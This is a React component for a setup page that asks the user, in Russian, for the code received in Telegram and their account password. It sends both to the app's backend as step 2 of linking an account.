import {useEffect, useState} from 'react';
import Header from "../../components/UI/Header.jsx";
import {Box, Button, Container, TextField, Typography} from "@mui/material";
import {useDispatch, useSelector} from "react-redux";
import {useNavigate, useParams} from "react-router-dom";
import {apiSuccessNull} from "../../store/slices/usersSlice";
import {sendApiInfo} from "../../store/actions/clientsActions";

const CodePage = () => {
    const apiSuccess = useSelector(state => state.users.apiSuccess)
    const dispatch = useDispatch();
    const push = useNavigate();
    const {id} = useParams()

    const [api, setApi] = useState({
        code: '',
        account_password: '',
        user_id: id,
        setupStep: 2,
    });

    const inputApiChangeHandler = e => {
        const {name, value} = e.target;
        setApi(prev => ({...prev, [name]: value}));
    };

    useEffect(() => {
        if (apiSuccess) {
            push('/answer/' + id);
            dispatch(apiSuccessNull());
        }
    }, [dispatch, apiSuccess]);

    const submitFormHandler = async e => {
        e.preventDefault();
        await dispatch(sendApiInfo({...api}));
    };

    return (
        <Container component="div" maxWidth="xl">
            <Header/>
            <Box sx={{display: 'flex', justifyContent: 'center'}}>
                <Box component="form" noValidate sx={{
                    mt: 1,
                    width: 450,
                    display: "flex",
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'center'
                }} onSubmit={(e) => submitFormHandler(e)}>
                    <Typography>
                        Введите код пришедший в телеграм.
                    </Typography>
                    <TextField
                        margin="normal"
                        required
                        fullWidth
                        name="account_password"
                        label="Пароль"
                        type="text"
                        id="password"
                        onChange={inputApiChangeHandler}
                    />
                    <TextField
                        margin="normal"
                        required
                        fullWidth
                        name="code"
                        label="Код"
                        type="text"
                        id="code"
                        onChange={inputApiChangeHandler}
                    />
                    <Button
                        type="submit"
                        fullWidth
                        disabled={!(api.code.length === 5 && api.account_password.length >= 8)}
                        variant="contained"
                        sx={{mt: 3, mb: 2}}
                    >
                        Далее
                    </Button>
                </Box>
            </Box>
        </Container>
    );
};

export default CodePage;
